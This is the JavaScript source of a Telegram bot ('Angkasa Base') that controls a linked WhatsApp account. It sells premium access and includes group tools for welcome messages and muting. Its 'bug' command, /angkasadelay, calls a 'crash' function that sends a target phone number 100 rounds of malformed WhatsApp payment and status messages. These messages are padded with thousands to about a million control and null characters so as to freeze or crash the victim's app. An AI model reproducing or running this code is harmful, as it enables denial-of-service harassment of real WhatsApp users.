const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const axios = require("axios");
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './ANGKASA/premium.json';
const ownerFile = './ANGKASA不是开发者/owner.json';
const TOKENS_FILE = "./ANGKASA不是开发者/tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.angkasa = function (command, ...middlewares) {
  this.command(command, ...middlewares);
};
bot.use(session());

let Angkasa = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/l2br04.jpg",
    "https://files.catbox.moe/a9rid9.jpg",
    "https://files.catbox.moe/obcvf0.jpg",
    "https://files.catbox.moe/acbwe0.jpg",
    "https://files.catbox.moe/3f26e8.jpg"
]; 

//=========================== DB LOCAL ============================

const WELCOME_FILE = "./ANGKASA不是开发者/welcome.json";
const LEFT_FILE = "./ANGKASA不是开发者/left.json";
const GROUP_FILE = "./ANGKASA不是开发者/mute&unmute.json";

//=========================== FUNCTION MORE ============================

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

const getUpTime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

//=========================== FUNCTION GROUP ============================

function initGroupSettings(chatId) {
  const data = loadJSON(GROUP_FILE);
  if (!data[chatId]) {
    data[chatId] = { mutedUsers: [], bannedUsers: [] };
    saveJSON(GROUP_FILE, data);
  }
  return data;
}

async function handleMute(ctx, isMute) {
  const chat = ctx.chat;
  const from = ctx.from;
  if (chat.type === "private")
    return ctx.reply(`<blockquote>❌ Perintah ini hanya bekerja di grup!</blockquote>`, { parse_mode: "HTML" });

  const admins = await ctx.telegram.getChatAdministrators(chat.id);
  const isAdmin = admins.some((x) => x.user.id === from.id);
  if (!isAdmin)
    return ctx.reply(`<blockquote>❌ Hanya admin yang bisa menggunakan perintah ini!</blockquote>`, { parse_mode: "HTML" });

  if (!ctx.message.reply_to_message)
    return ctx.reply(`<blockquote>⚠️ Balas pesan pengguna yang ingin dimute/unmute!</blockquote>`, { parse_mode: "HTML" });

  const user = ctx.message.reply_to_message.from;
  const userId = user.id;

  const data = loadJSON(GROUP_FILE);
  if (!data[chat.id]) data[chat.id] = { mutedUsers: [], bannedUsers: [] };

  if (isMute) {
    if (data[chat.id].mutedUsers.includes(userId)) {
      return ctx.reply(`<blockquote>⚠️ Pengguna ini sudah dimute!</blockquote>`, { parse_mode: "HTML" });
    }
    data[chat.id].mutedUsers.push(userId);
    saveJSON(GROUP_FILE, data);
    await ctx.reply(`<blockquote>🔇 Pengguna <b>${user.first_name}</b> telah dimute!</blockquote>`, { parse_mode: "HTML" });
  } else {
    if (!data[chat.id].mutedUsers.includes(userId)) {
      return ctx.reply(`<blockquote>⚠️ Pengguna ini tidak sedang dimute!</blockquote>`, { parse_mode: "HTML" });
    }
    data[chat.id].mutedUsers = data[chat.id].mutedUsers.filter((id) => id !== userId);
    saveJSON(GROUP_FILE, data);
    await ctx.reply(`<blockquote>🔊 Pengguna <b>${user.first_name}</b> telah diunmute!</blockquote>`, { parse_mode: "HTML" });
  }
}

//==================== KONEKSI WHATSAPP ===================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P',
        }),
    };

    Angkasa = makeWASocket(connectionOptions);

    Angkasa.ev.on('creds.update', saveCreds);
    store.bind(Angkasa.ev);

    Angkasa.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃ ${chalk.red.bold('WHATSAPP TERPUTUS')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`),
                shouldReconnect ? chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃ ${chalk.red.bold('HUBUNGKAN ULANG')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`) : ''
            );
            if (shouldReconnect) {
                startSesi();
                console.clear();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let owner = loadJSON(ownerFile);
let premium = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
    if (!owner.includes(ctx.from.id.toString())) {
        return ctx.reply(`<blockquote>⛔ Akses Di Tolak! Anda bukan owner.</blockquote>`, {
        parse_mode: "HTML"
        });
    }
    next();
};

const checkPremium = (ctx, next) => {
    let premiumData = require(premiumFile);
    const userId = ctx.from.id.toString();
    const user = premiumData.find(u => u.userId === userId);

    if (!user) {
        return ctx.reply(`<blockquote>❌ Anda bukan pengguna premium.. Buy Premium Di @angkasanyabobo</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    if (Date.now() > user.expires) {
        
        premiumData = premiumData.filter(u => u.userId !== userId);
        saveJSON(premiumFile, premiumData);
        return ctx.reply(`<blockquote>❌ Status premium Anda sudah habis.. Buy Premium Di @angkasanyabobo</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`<blockquote>❌ WhatsApp belum terhubung. Silakan hubungi owner agar menghubungkan sender.</blockquote>`, {
        parse_mode: "HTML"
        });
    return;
  }
  next();
};

bot.angkasa("start", async (ctx) => {
  await sendStartMenu(ctx);
});

const sendStartMenu = async (ctx) => {
  const image = getRandomImage();
  const nama = ctx.from.first_name || ctx.from.username || "User";
  const RUNTIME = getUpTime();
  const VERSION = "0.1";
  
  const caption = `<blockquote><b>╔─═⊱ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ─═⬣</b>
<b>║ Nᴀᴍᴇ: ${nama}</b>
<b>║ Dᴇᴠ: @angkasanyabobo</b>
<b>║ Vᴇʀsɪᴏɴ: ${VERSION}</b>
<b>║ Oɴʟɪɴᴇ: ${RUNTIME}</b>
<b>┗━━━━━━━━━━━━━━━⬣</b>
✨ 안녕하세요 사용자 👋<b>${nama}</b>저는 넥소라 개발자들이 개발한 퓨리의 넥소라입니다. 무고한 사람들을 괴롭히는 짓은 그만둬 주세요.\n너는 주인에게 풀려난 개다</blockquote>`;

  const menu = {  
    caption,  
    parse_mode: 'HTML',  
    reply_markup: {  
      inline_keyboard: [  
        [ 
          { text: "𝐎𝐰𝐧𝐞𝐫", callback_data: "owner_menu" }, 
          { text: "𝐆𝐫𝐨𝐮𝐩", callback_data: "group_menu" }
        ],
        [   
          { text: "𝐁𝐮𝐠", callback_data: "bug_menu" },
          { text: "𝐓𝐪𝐭𝐨", callback_data: "tqto_menu" }
        ],
        [ 
          { text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url: "https://t.me/angkasanyabobo" }
        ]
      ]  
    }  
  };  

  return ctx.replyWithPhoto({ url: image }, menu);
};

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const nama = ctx.from.first_name || ctx.from.username || "User";

  const update = async (ctx, teks, buttons = [], withPhoto = false) => {
    try {
      await ctx.deleteMessage();
    } catch (e) {}

    if (withPhoto) {
      const image = getRandomImage();
      return ctx.replyWithPhoto(
        { url: image },
        {
          caption: teks,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: buttons },
        }
      );
    } else {
      return ctx.reply(teks, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons },
    });
  }
};

if (data === "owner_menu") {
  return update(ctx, 
`<blockquote>༶•┈┈♛ 𝐀𝐍𝐆𝐊𝐀𝐒𝐀 𝐁𝐀𝐒𝐄 ♛┈┈•༶
╔✥══ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ══✥╗
║ /addprem
║ /delprem
║ /listprem
║ /cekprem
║ /pairingcode
╚✥═══════★═══════✥╝</blockquote>`,
    [[{ text: "⬅️ Kembali", callback_data: "back_start" }]],
    true
  );
}

if (data === "group_menu") {
  return update(ctx, 
`<blockquote>༶•┈┈♛ 𝐀𝐍𝐆𝐊𝐀𝐒𝐀 𝐁𝐀𝐒𝐄 ♛┈┈•༶
╔✥══ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ══✥╗
║ /setwelcome
║ /setleft
║ /mute
║ /unmute
╚✥═══════★═══════✥╝</blockquote>`,
    [[{ text: "⬅️ Kembali", callback_data: "back_start" }]],
    true
  );
}

if (data === "bug_menu") {
  return update(ctx, 
`<blockquote>༶•┈┈♛ 𝐀𝐍𝐆𝐊𝐀𝐒𝐀 𝐁𝐀𝐒𝐄 ♛┈┈•༶
╔✥══ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ══✥╗
║ /angkasadelay
╚✥══════★══════✥╝</blockquote>`,
    [[{ text: "⬅️ Kembali", callback_data: "back_start" }]],
    true
  );
}
  
if (data === "tqto_menu") {
  return update(ctx, 
`<blockquote>༶•┈┈♛ 𝐀𝐍𝐆𝐊𝐀𝐒𝐀 𝐁𝐀𝐒𝐄 ♛┈┈•༶
╔✥══ 𝐓𝐇𝐀𝐍𝐊𝐒  𝐅𝐎𝐑 ══✥╗
║ 𝐀𝐥𝐥𝐚𝐡 𝐒𝐰𝐭 ( 𝐓𝐡𝐞 𝐌𝐲 𝐆𝐨𝐝 )
║ 𝐌𝐲 𝐏𝐚𝐫𝐞𝐧𝐭𝐬 ( 𝐌𝐲 𝐅𝐚𝐦𝐢𝐥𝐲 )
║ 𝐙𝐚𝐡𝐫𝐚 ( 𝐌𝐲 𝐒𝐢𝐬𝐭𝐞𝐫 )
║ 𝐅𝐭𝐦𝐧 ( 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 )
║ 𝐀𝐳𝐤𝐚 𝐋𝐲𝐨𝐨𝐫𝐚 ( 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 )
║ 𝐀𝐱𝐜𝐚𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 ( 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 )
║ 𝐑𝐚𝐟𝐳 𝐗 𝐁𝐨𝐲 ( 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 )
║ 𝐏𝐚𝐫𝐚 𝐇𝐞𝐭𝐞𝐫𝐬
╚✥═══════★═══════✥╝</blockquote>`,
    [[{ text: "⬅️ Kembali", callback_data: "back_start" }]],
    true
  );
}

  if (data === "back_start") {
    try { await ctx.deleteMessage(); } catch (e) {}
    return sendStartMenu(ctx);
  }
});

//=========================== OWNER MENU ============================

bot.angkasa('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 3) {
        return ctx.reply(`<blockquote>❌ Gunakan format: /addprem Id User hari\nContoh: /addprem 75189916 30</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];
    const days = parseInt(args[2]);
    if (isNaN(days) || days <= 0) {
        return ctx.reply(`<blockquote>❌ Masukkan jumlah hari yang valid.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    let premiumData = require(premiumFile);
    const now = Date.now();
    const expiresAt = now + days * 24 * 60 * 60 * 1000;

    const existing = premiumData.find(u => u.userId === userId);
    if (existing) {

        existing.expires = expiresAt;
    } else {

        premiumData.push({ userId, expires: expiresAt });
    }

    saveJSON(premiumFile, premiumData);

    return ctx.reply(`<blockquote>🎉 Pengguna ${userId} sekarang premium selama ${days} hari!</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.angkasa('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(`<blockquote>❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];

    let premiumData = require(premiumFile);
    const exists = premiumData.find(u => u.userId === userId);
    if (!exists) {
        return ctx.reply(`<blockquote>❌ Pengguna ${userId} tidak ada dalam daftar premium.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    premiumData = premiumData.filter(u => u.userId !== userId);
    saveJSON(premiumFile, premiumData);

    return ctx.reply(`<blockquote>🚫 Pengguna ${userId} telah dihapus dari daftar premium.</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.angkasa('cekprem', (ctx) => {
    let premiumData = require(premiumFile);
    const userId = ctx.from.id.toString();
    const user = premiumData.find(u => u.userId === userId);

    if (!user) {
        return ctx.reply(`<blockquote>❌ Anda bukan pengguna premium.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    if (Date.now() > user.expires) {
        premiumData = premiumData.filter(u => u.userId !== userId);
        saveJSON(premiumFile, premiumData);
        return ctx.reply(`<blockquote>❌ Status premium Anda sudah habis.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const remaining = Math.ceil((user.expires - Date.now()) / (1000 * 60 * 60 * 24));
    return ctx.reply(`<blockquote>✅ Anda adalah pengguna premium.\nSisa hari: ${remaining} hari</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.angkasa("pairingcode", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply(`<blockquote>❌ Format perintah salah. Gunakan: /pairingcode nomor wa</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Angkasa && Angkasa.user) {
        return await ctx.reply(`<blockquote>WhatsApp sudah terhubung. Tidak perlu pairing lagi.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    try {
        const code = await Angkasa.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`
✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}
\`\`\``;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply(`<blockquote>❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.</blockquote>`, {
        parse_mode: "HTML"
        });
    }
});

//=========================== GROUP MENU ============================

bot.angkasa("setwelcome", async (ctx) => {
  const chat = ctx.chat;
  const sender = ctx.from;
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!chat.type.includes("group")) {
    return ctx.reply(`<blockquote>❌ Hanya untuk grup.</blockquote>`, {
    parse_mode: "HTML" 
    });
  }

  const admins = await ctx.telegram.getChatAdministrators(chat.id);
  const isAdmin = admins.some((x) => x.user.id === sender.id);
  if (!isAdmin) {
    return ctx.reply(`<blockquote>❌ Hanya admin yang bisa set welcome.</blockquote>`, {
    parse_mode: "HTML" 
    });
  }

  if (!text) {
    return ctx.reply(`<blockquote>⚠️ Format salah!\nGunakan:\n/setwelcome Selamat datang @name di @group jam @time</blockquote>`, {
      parse_mode: "HTML",
    });
  }

  const data = loadJSON(WELCOME_FILE);
  data[chat.id] = text;
  saveJSON(WELCOME_FILE, data);

  return ctx.reply(`<blockquote>✅ Pesan welcome berhasil disimpan.</blockquote>`, {
  parse_mode: "HTML" 
  });
});

bot.on("new_chat_members", async (ctx) => {
  const chatId = ctx.chat.id;
  const groupName = ctx.chat.title;
  const data = loadJSON(WELCOME_FILE);
  const template = data[chatId];
  if (!template) return;

  for (const user of ctx.message.new_chat_members) {
    const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const nameTag = user.username ? `@${user.username}` : user.first_name || "User";

    const text = `<blockquote>${template
      .replace(/@name/gi, nameTag)
      .replace(/@group/gi, groupName)
      .replace(/@time/gi, waktu)}</blockquote>`;

    try {
      const photos = await ctx.telegram.getUserProfilePhotos(user.id, { limit: 1 });
      let photoUrl = null;

      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const file = await ctx.telegram.getFile(fileId);
        photoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      }

      if (photoUrl) {
        await ctx.replyWithPhoto(
          { url: photoUrl },
          {
            caption: text,
            parse_mode: "HTML",
          }
        );
      } else {
        await ctx.replyWithPhoto(
          { url: getRandomImage() },
          {
            caption: text,
            parse_mode: "HTML",
          }
        );
      }
    } catch (err) {
      console.error("❌ Gagal kirim foto welcome:", err.message);
      await ctx.reply(text, { parse_mode: "HTML" });
    }
  }
});

bot.angkasa("setleft", async (ctx) => {
  const chat = ctx.chat;
  const sender = ctx.from;
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!chat.type.includes("group")) {
    return ctx.reply(`<blockquote>❌ Hanya untuk grup.</blockquote>`, { parse_mode: "HTML" });
  }

  const admins = await ctx.telegram.getChatAdministrators(chat.id);
  const isAdmin = admins.some((x) => x.user.id === sender.id);
  if (!isAdmin) {
    return ctx.reply(`<blockquote>❌ Hanya admin yang bisa set left.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!text) {
    return ctx.reply(
      `<blockquote>⚠️ Format salah!\nGunakan:\n/setleft Selamat tinggal @name dari @group jam @time</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const data = loadJSON(LEFT_FILE);
  data[chat.id] = data[chat.id] || {};
  data[chat.id].left = text;
  saveJSON(LEFT_FILE, data);

  return ctx.reply(`<blockquote>✅ Pesan left berhasil disimpan.</blockquote>`, { parse_mode: "HTML" });
});

bot.on("left_chat_member", async (ctx) => {
  const chatId = ctx.chat.id;
  const groupName = ctx.chat.title;
  const data = loadJSON(LEFT_FILE);
  const template = data[chatId]?.left;
  if (!template) return;

  const user = ctx.message.left_chat_member;
  const waktu = moment().tz("Asia/Jakarta").format("HH:mm:ss");
  const nameTag = user.username ? `@${user.username}` : user.first_name || "User";

  const text = `<blockquote>${template
    .replace(/@name/gi, nameTag)
    .replace(/@group/gi, groupName)
    .replace(/@time/gi, waktu)}</blockquote>`;

  try {
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (err) {
    console.error("❌ Gagal kirim pesan left:", err.message);
  }
});

bot.angkasa("mute", async (ctx) => handleMute(ctx, true));

bot.angkasa("unmute", async (ctx) => handleMute(ctx, false));

bot.on("message", async (ctx) => {
  if (ctx.chat.type === "private" || !ctx.message.text) return;

  const data = loadJSON(GROUP_FILE);
  if (!data[ctx.chat.id]) return;
  const settings = data[ctx.chat.id];
  const userId = ctx.from.id;

  if (settings.mutedUsers.includes(userId)) {
    try {
      await ctx.deleteMessage();
      await ctx.reply(
        `<blockquote>@${ctx.from.username || ctx.from.first_name}, Anda sedang dimute dan tidak bisa mengirim pesan.</blockquote>`,
        { parse_mode: "HTML", reply_parameters: { message_id: ctx.message.message_id } }
      );
    } catch (err) {
      console.error("Gagal hapus pesan mute:", err.message);
    }
  }
});

bot.angkasa("cekidch", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply("❌ Silakan masukkan link channel WhatsApp.");
  }

  if (!text.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link tautan channel tidak valid.");
  }

  try {
    const channelCode = text.split('https://whatsapp.com/channel/')[1];

    // 🔥 fungsi API cek channel WA (kalau kamu punya koneksi ke WhatsApp)
    const res = await client.newsletterMetadata("invite", channelCode);

    if (!res || !res.id) {
      return ctx.reply("⚠️ Gagal mendapatkan informasi channel. Pastikan link yang Anda berikan benar dan channel tersebut publik.");
    }

    const verificationStatus = res.verification === "VERIFIED" ? "✅ Terverifikasi" : "❌ Tidak Terverifikasi";

    const teks = `<b>📢 Detail Informasi Channel</b>\n\n` +
                 `<b>ID :</b> <code>${res.id}</code>\n` +
                 `<b>Nama :</b> ${res.name}\n` +
                 `<b>Total Pengikut :</b> ${res.subscribers}\n` +
                 `<b>Status :</b> ${res.state}\n` +
                 `<b>Verifikasi :</b> ${verificationStatus}`;

    await ctx.reply(teks, { parse_mode: "HTML" });

  } catch (e) {
    console.error("Error pada perintah 'cekidch':", e);
    ctx.reply("❌ Terjadi kesalahan. Pastikan link channel valid dan bot tersambung ke WhatsApp.");
  }
});

//=========================== BUG MENU ============================

bot.angkasa("angkasadelay", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`<blockquote>Bukan Gitu, Contoh: /angkasadelay 62×××</blockquote>`, {
    parse_mode: "HTML"
    });
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.reply(`<blockquote>[ 𝙿 𝚁 𝙾 𝚂 𝙴 𝚂  𝚂 𝙴 𝙽 𝙳  𝙱 𝚄 𝙶 ]\nTARGET:${q}</blockquote>`, { 
  parse_mode: "HTML" 
  });
  const processMessageId = processMessage.message_id; 

    for (let i = 0; i < 20; i++) {
    await AngkasaDelay(target);
    await AngkasaDelay(target);
    await AngkasaDelay(target);
    await AngkasaDelay(target);
    await AngkasaDelay(target);
    }
    
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`[ 𝚂 𝙴 𝙽 𝙳  𝙱 𝚄 𝙶  𝚂 𝚄 𝙲 𝙲 𝙴 𝚂 𝚂 ]\nTARGET : ${q} \nTYPE DONE:✅`, {
  parse_mode: "HTML"
  });
});
  
// ========================= [ CRASH FUNCT ] =========================

async function AngkasaDelay(target) {
  try {
    const payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(target, payMessage, {});
    await Angkasa.relayMessage(target, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: target },
      userJid: target,
    });

    const msgStory = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "Angkasa Disini Jan Macem Macem",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await Angkasa.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [target],
      messageId: msgStory.key.id,
    });
  } catch (err) {
  }
}
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    console.log("✨ Selamat Menggunakan Base Angkasa😊");
    startSesi();

    console.log("Sukses connected");
    bot.launch();
})();